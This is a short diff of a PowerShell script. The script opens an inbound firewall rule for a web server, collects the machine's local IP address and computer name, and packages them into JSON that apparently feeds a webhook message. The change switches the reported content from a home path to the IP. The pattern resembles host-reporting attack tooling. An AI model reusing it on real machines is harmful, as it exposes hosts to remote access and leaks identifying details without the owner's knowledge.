@@ -54,7 +54,7 @@ New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol T
 $loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi" | Select-Object -ExpandProperty IPAddress
 $hpath = Get-Content -Path "$env:temp/homepath.txt"
 
-$escmsgsys = $hpath -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+$escmsgsys = $loip -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" 
             "content" = $escmsgsys} | ConvertTo-Json
 Start-Sleep 1
